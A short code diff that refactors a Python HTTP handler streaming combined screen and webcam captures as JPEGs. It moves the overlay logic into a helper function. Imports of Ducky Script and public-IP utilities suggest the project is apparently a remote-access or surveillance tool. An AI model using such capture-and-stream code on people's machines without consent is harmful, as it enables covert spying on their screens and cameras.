@@ -13,6 +13,7 @@ from threading import Thread
 from .duckyscript import toducky
 from pyautogui import screenshot
 from .general import get_public_ip
+from .overlays import screen_and_webcam_pic
 from cv2 import cvtColor, resize, imencode, COLOR_BGR2RGB, VideoCapture
 
 
@@ -450,14 +451,7 @@ def webcamandscreenstreamhandlermaker(cap):
                 self.end_headers()
                 try:
                     while cap.isOpened():
-                        img = screenshot()
-                        img = np.array(img)
-                        img = cvtColor(img, COLOR_BGR2RGB)
-                        ret, frame = cap.read()
-                        fr_height, fr_width, _ = frame.shape
-                        frame = resize(frame, (fr_width//2, fr_height//2))
-                        fr_height, fr_width, _ = frame.shape
-                        img[0:fr_height, 0:fr_width, :] = frame[0:fr_height, 0:fr_width, :]
+                        ret, img = screen_and_webcam_pic(cap)
                         if not ret:
                             continue
                         _, jpeg = imencode('.jpg', img)
